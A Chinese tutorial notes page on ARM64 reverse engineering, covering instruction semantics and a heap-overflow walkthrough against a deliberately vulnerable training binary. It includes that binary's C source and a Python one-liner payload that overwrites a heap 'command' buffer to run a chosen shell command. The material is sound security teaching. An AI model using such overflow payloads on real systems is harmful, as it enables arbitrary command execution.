<td>lsl/lsr</td> <td>逻辑左移（Logical shift left）逻辑右移（Logical shift right）</td> </tr> <tr> <td>ldr</td> <td>加载寄存器值</td> </tr> <tr> <td>str</td> <td>存储寄存器值</td> </tr> <tr> <td>ldp/stp</td> <td>相比于LDR和STR指令(8 bytes)，LDP和STP指令用于多字节(16 bytes)操作</td> </tr> <tr> <td>adr</td> <td>PC指针相关偏移处的地址</td> </tr> <tr> <td>adrp</td> <td>PC指针相关偏移处的页的基地址</td> </tr> <tr> <td>cmp</td> <td>比较两个值，标志会自动更新（N – 结果为31位，如果结果为零则为 Z，如果溢出则为 V，如果不是借位则为 C）</td> </tr> <tr> <td>bne</td> <td>不相等跳转指令，当zero flag没有设置时跳转</td> </tr> </tbody> </table> <h2 id=_1>系统寄存器<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>除此之外，可能还有一些系统特定的寄存器，这些寄存器仅在该特定操作系统上可用。例如，iOS 中存在以下寄存器</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-003.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt=arm64_reversing_and_exploitation_part_1-003.png src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-003.png></a></p> <h2 id=_2>读/写系统寄存器<a class=headerlink href=#_2 title="Permanent link">&para;</a></h2> <p>MRS、systemreg -&gt; 从系统寄存器读取到目标寄存器 Xt</p> <p>MSR、systemreg -&gt; 将 Xt 寄存器中存储的值写入系统寄存器</p> <p>例如，使用 MSR PAN, #1 设置 PAN 位，使用 MSR PAN, #0 清除 PAN 位</p> <h2 id=_3>函数头/尾<a class=headerlink href=#_3 title="Permanent link">&para;</a></h2> <p>函数头 – 出现在函数的开头，准备堆栈和寄存器以便在函数内使用</p> <p>函数尾 – 出现在函数末尾，恢复堆栈并注册到函数调用之前的原始状态</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-004.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt=arm64_reversing_and_exploitation_part_1-004.png src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-004.png></a></p> <h2 id=_4>例子<a class=headerlink href=#_4 title="Permanent link">&para;</a></h2> <ul> <li>mov x0, x1 -&gt; x0 = x1</li> <li>movn x0, 1 -&gt; x0 = -1</li> <li>add x0, x1 -&gt; x0 = x0 + x1</li> <li>ldr x0, [x1] -&gt; x0 = *x1 -&gt; x0 = address stored in x1</li> <li>ldr x0, [x1, 0x10]! -&gt; x1 += 0x10; x0 = *x1(Pre-Indexing mode)</li> <li>ldr x0, [x1], 0x10 -&gt; x0 = *x1; x1 += 0x10 (Post-Indexing mode)</li> <li>str x0, [x1] -&gt; *x1 = x0 -&gt; Destination is on the right</li> <li>ldr x0, [x1, 0x10] -&gt; x0 = *(x1 + 0x10)</li> <li>ldrb w0, [x1] -&gt; Load a byte from address stored in x1</li> <li>ldrsb w0, [x1] -&gt; Load a signed byte from address stored in x1</li> <li>adr x0, label -&gt; Load address of labels into x0</li> <li>stp x0, x1, [x2] -&gt; <em>x2 = x0; </em>(x2 + 8) = x1</li> <li>stp x29, x30, [sp, -64]! -&gt; store x29, x30 (LR) on stack</li> <li>ldp x29, x30, [sp], 64] -&gt; Restore x29, x30 (LR) from the stack</li> <li>svc 0 -&gt; Perform a syscall (syscall number x16 register)</li> <li>str x0, [x29] -&gt; store x0 at the address in x29 (destination on right)</li> <li>ldr x0, [x29] -&gt; load the value from the address in x29 into x0</li> <li>blr x0 -&gt; calls the subroutine at the address stored in x0, store next instruction in link register (x30)</li> <li>br x0 -&gt; Jump to address stored in x0</li> <li>bl label -&gt; Branch to label, store next instruction in link register (x30)</li> <li>bl printf -&gt; Call the printf function with arguments stored x0, x1</li> <li>ret -&gt; Jump to the address stored in x30</li> </ul> <h2 id=_5>一个简单的堆溢出<a class=headerlink href=#_5 title="Permanent link">&para;</a></h2> <p>让我们为 ARM 二进制文件编写一个简单的堆溢出漏洞利用。先看一下程序执行的结果</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-005.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt=arm64_reversing_and_exploitation_part_1-005.png src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-005.png></a></p> <p>看一看Ghidra反编译的结果，经过部分变量和函数重命名，大致的反编译结果如下，其中</p> <ul> <li>stp指令将栈指针x29和链接寄存器x30推送到栈上，为函数调用保存状态</li> <li>str指令将寄存器x19保存到栈上</li> <li>mov指令保存sp到x29</li> </ul> <p>至此，完成函数的初始化</p> <ul> <li>cmp和b.gt指令：如果参数个数小于1，则跳转到<code>LAB_001019e4</code></li> <li>LAB_001019e4：如果参数个数小于1，打印错误信息 “Better luck next time” 并退出</li> <li>cmp和b.ne指令：如果argc==3，则加载第二个参数的指针到argc，并将argv指针保存到x19</li> <li>随后使用strcmp比较字符串，相等时，调用<code>_heapOverflow</code>函数</li> </ul> <p>调用结束后，使用ldp恢复栈指针和链接寄存器，返回</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-006.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt=arm64_reversing_and_exploitation_part_1-006.png src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-006.png></a></p> <p>所以，我们需要做什么才能跳转到函数 <code>heapOverflow</code>呢？</p> <p>为此，必须满足以下要求：</p> <ul> <li>传递三个参数（或 2 个，因为 C 程序中的第一个参数是调用该程序的命令） </li> <li>argv[1] 应为字符串“heap” </li> <li>argv[2] 应该是作为第一个参数传递给函数 heapOverflow 的参数** </li> </ul> <p>回忆一下，C 中的 main 函数原型</p> <div class=highlight><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal>1</span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-0-1><span class=kt>int</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span></code></pre></div></td></tr></table></div> <p><strong>argc</strong> – 一个整数，包含 argv 中后面的参数计数。 argc 参数始终大于或等于 1。</p> <p><strong>argv</strong> – 一个以 null 结尾的字符串数组，表示程序用户输入的命令行参数。按照约定，<code>argv[0]</code> 是调用程序的命令，<code>argv[1]</code> 是第一个命令行参数，依此类推，直到 <code>argv[argc]</code>，它始终为 NULL</p> <p>看一下 <code>heapOverflow</code> 函数的伪代码，这里部分变量名经过了修复</p> <div class=highlight><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal> 1</span>
<span class=normal> 2</span>
<span class=normal> 3</span>
<span class=normal> 4</span>
<span class=normal> 5</span>
<span class=normal> 6</span>
<span class=normal> 7</span>
<span class=normal> 8</span>
<span class=normal> 9</span>
<span class=normal>10</span>
<span class=normal>11</span>
<span class=normal>12</span>
<span class=normal>13</span>
<span class=normal>14</span>
<span class=normal>15</span>
<span class=normal>16</span>
<span class=normal>17</span>
<span class=normal>18</span>
<span class=normal>19</span>
<span class=normal>20</span>
<span class=normal>21</span>
<span class=normal>22</span>
<span class=normal>23</span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-1-1><span class=kt>int</span><span class=w> </span><span class=nf>_heapOverflow</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>param_1</span><span class=p>)</span>
</span><span id=__span-1-2>
</span><span id=__span-1-3><span class=p>{</span>
</span><span id=__span-1-4><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>iVar1</span><span class=p>;</span>
</span><span id=__span-1-5><span class=w>  </span><span class=kt>FILE</span><span class=w> </span><span class=o>*</span><span class=n>f</span><span class=p>;</span>
</span><span id=__span-1-6><span class=w>  </span><span class=kt>size_t</span><span class=w> </span><span class=n>fs</span><span class=p>;</span>
</span><span id=__span-1-7><span class=w>  </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>__name</span><span class=p>;</span>
</span><span id=__span-1-8><span class=w>  </span><span class=n>undefined4</span><span class=w> </span><span class=o>*</span><span class=n>__command</span><span class=p>;</span>
</span><span id=__span-1-9>
</span><span id=__span-1-10><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Heap overflow challenge. Execute a shell command of your choice on the device&quot;</span><span class=p>);</span>
</span><span id=__span-1-11><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Welcome: from %s, printing out the current user</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>param_1</span><span class=p>);</span>
</span><span id=__span-1-12><span class=w>  </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fopen</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=s>&quot;rb&quot;</span><span class=p>);</span>
</span><span id=__span-1-13><span class=w>  </span><span class=n>fseek</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span><span id=__span-1-14><span class=w>  </span><span class=n>fs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ftell</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span><span id=__span-1-15><span class=w>  </span><span class=n>fseek</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-1-16><span class=w>  </span><span class=n>__name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span><span id=__span-1-17><span class=w>  </span><span class=n>__command</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>undefined4</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span><span id=__span-1-18><span class=w>  </span><span class=o>*</span><span class=n>__command</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x616f6877</span><span class=p>;</span>
</span><span id=__span-1-19><span class=w>  </span><span class=o>*</span><span class=p>(</span><span class=n>undefined4</span><span class=w> </span><span class=o>*</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=n>__command</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x696d61</span><span class=p>;</span>
</span><span id=__span-1-20><span class=w>  </span><span class=n>fread</span><span class=p>(</span><span class=n>__name</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>fs</span><span class=p>,</span><span class=n>f</span><span class=p>);</span>
</span><span id=__span-1-21><span class=w>  </span><span class=n>iVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>system</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>__command</span><span class=p>);</span>
</span><span id=__span-1-22><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>iVar1</span><span class=p>;</span>
</span><span id=__span-1-23><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>所以看起来它试图打开一个文件，该文件的名称作为传递给它的第一个参数。最后，还有一个对执行命令的系统函数的调用，输入是<code>__command</code>，对应到汇编上为<code>x22</code>寄存器；<code>__name</code>(x21)的分配为 0x400 字节，使用 fread 命令读取（<code>fread(__name,1,fs,f);</code>）</p> <p>我们在设备上创建一个简单的文件并将其作为漏洞二进制文件的输入传递。</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-007.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt=arm64_reversing_and_exploitation_part_1-007.png src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-007.png></a></p> <p>看起来它打印出了 <code>whoami</code> 命令的输入</p> <p>让我们稍微看一下程序的源码</p> <div class=highlight><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal> 1</span>
<span class=normal> 2</span>
<span class=normal> 3</span>
<span class=normal> 4</span>
<span class=normal> 5</span>
<span class=normal> 6</span>
<span class=normal> 7</span>
<span class=normal> 8</span>
<span class=normal> 9</span>
<span class=normal>10</span>
<span class=normal>11</span>
<span class=normal>12</span>
<span class=normal>13</span>
<span class=normal>14</span>
<span class=normal>15</span>
<span class=normal>16</span>
<span class=normal>17</span>
<span class=normal>18</span>
<span class=normal>19</span>
<span class=normal>20</span>
<span class=normal>21</span>
<span class=normal>22</span>
<span class=normal>23</span>
<span class=normal>24</span>
<span class=normal>25</span>
<span class=normal>26</span>
<span class=normal>27</span>
<span class=normal>28</span>
<span class=normal>29</span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-2-1><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
</span><span id=__span-2-2><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdlib.h&gt;</span>
</span><span id=__span-2-3><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;string.h&gt;</span>
</span><span id=__span-2-4>
</span><span id=__span-2-5><span class=kt>void</span><span class=w> </span><span class=nf>heapOverflow</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>);</span>
</span><span id=__span-2-6>
</span><span id=__span-2-7><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=o>**</span><span class=w> </span><span class=n>argv</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-2-8><span class=w>    </span><span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>1</span><span class=p>){</span>
</span><span id=__span-2-9><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Better luck next time</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
</span><span id=__span-2-10><span class=w>    </span><span class=p>}</span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;heap&quot;</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>){</span>
</span><span id=__span-2-11><span class=w>        </span><span class=n>heapOverflow</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span><span id=__span-2-12><span class=w>    </span><span class=p>}</span>
</span><span id=__span-2-13><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-2-14><span class=p>}</span>
</span><span id=__span-2-15>
</span><span id=__span-2-16><span class=kt>void</span><span class=w> </span><span class=nf>heapOverflow</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>){</span>
</span><span id=__span-2-17><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Heap overflow challenge. Execute a shell command of your choice on the device</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
</span><span id=__span-2-18><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Welcome: from %s, printing out the current user</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>);</span>
</span><span id=__span-2-19><span class=w>    </span><span class=kt>FILE</span><span class=w> </span><span class=o>*</span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fopen</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=s>&quot;rb&quot;</span><span class=p>);</span>
</span><span id=__span-2-20><span class=w>    </span><span class=n>fseek</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>SEEK_END</span><span class=p>);</span>
</span><span id=__span-2-21><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>fs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ftell</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span><span id=__span-2-22><span class=w>    </span><span class=n>fseek</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>SEEK_SET</span><span class=p>);</span>
</span><span id=__span-2-23><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span><span id=__span-2-24><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>command</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span><span id=__span-2-25><span class=w>    </span><span class=n>strcpy</span><span class=p>(</span><span class=n>command</span><span class=p>,</span><span class=s>&quot;whoami&quot;</span><span class=p>);</span>
</span><span id=__span-2-26><span class=w>    </span><span class=n>fread</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>fs</span><span class=p>,</span><span class=w> </span><span class=n>f</span><span class=p>);</span>
</span><span id=__span-2-27><span class=w>    </span><span class=n>system</span><span class=p>(</span><span class=n>command</span><span class=p>);</span>
</span><span id=__span-2-28><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-2-29><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>果然，传递长度超过 0x400 字节的文件会溢出到相邻的内存，并可能最终溢出到字符串“command”，因此当进行系统调用时，我们也许可以调用我们自己的命令。</p> <p>使用python生成恶意的文件</p> <div class=highlight><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal>1</span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-3-1>python<span class=w> </span>-c<span class=w> </span><span class=s1>&#39;print(&quot;/&quot;*0x400+&quot;/bin/ls\x00&quot;)&#39;</span><span class=w> </span>&gt;<span class=w> </span>hax.txt
</span></code></pre></div></td></tr></table></div> <p>然后将它推送到设备中并作为二进制的输入执行，当保护关闭的情况下，会执行<code>ls</code>命令</p> <!-- taken from 
https://github.com/squidfunk/mkdocs-material/blob/master/src/partials/source-file.html --> <hr> <div class=md-source-file> <small> <!-- mkdocs-git-revision-date-localized-plugin --> </small> </div> <h2 id=__comments>评论</h2> <!-- Insert generated snippet here --> <!-- page.meta.number is defined --> <script src=https://giscus.app/client.js data-repo=jygzyc/notes data-repo-id=R_kgDOJrOxMQ data-mapping=number data-term=28 data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=preferred_color_scheme data-lang=zh-CN data-loading=lazy crossorigin=anonymous async>
        </script> <!-- Synchronize Giscus theme with palette --> <script>
        var giscus = document.querySelector("script[src*=giscus]")

        // Set palette on initial load
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
            var theme = palette.color.scheme === "slate"
                ? "transparent_dark"
                : "light"

            // Instruct Giscus to set theme
            giscus.setAttribute("data-theme", theme) 
        }

        // Register event handlers after documented loaded
        document.addEventListener("DOMContentLoaded", function() {
            var ref = document.querySelector("[data-md-component=palette]")
            ref.addEventListener("change", function() {
                var palette = __md_get("__palette")
                if (palette && typeof palette.color === "object") {
                    var theme = palette.color.scheme === "slate"
                        ? "transparent_dark"
                        : "light"

                    // Instruct Giscus to change theme
                    var frame = document.querySelector(".giscus-frame")
                    frame.contentWindow.postMessage(
                        { giscus: { setConfig: { theme } } },
                        "https://giscus.app"
                    )
                }
            })
        })
    </script> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> 回到页面顶部 </button> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../note-teezz/ class="md-footer__link md-footer__link--prev" aria-label="上一页: TEEzz：Fuzzing Trusted Applications on COTS Android Devices 笔记"> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </div> <div class=md-footer__title> <span class=md-footer__direction> 上一页 </span> <div class=md-ellipsis> TEEzz：Fuzzing Trusted Applications on COTS Android Devices 笔记 </div> </div> </a> <a href=../arm64-reversing-and-exploitation-part-2/ class="md-footer__link md-footer__link--next" aria-label="下一页: ARM64逆向和利用 Part2——Use After Free（笔记）"> <div class=md-footer__title> <span class=md-footer__direction> 下一页 </span> <div class=md-ellipsis> ARM64逆向和利用 Part2——Use After Free（笔记） </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> 版权所有 © 2022-2024 Ecool的知识花园 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-progress data-md-component=progress role=progressbar></div> <script id=__config type=application/json>{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.footer", "navigation.top", "navigation.path", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "search.suggest", "search.highlight", "search.share", "navigation.indexes", "navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.prune", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script> <script src=../../../../assets/javascripts/bundle.83f73b43.min.js></script> <script src=../../../../js/extra.js></script> <script src=../../../../js/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js></script> <script id=init-glightbox>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script></body> </html>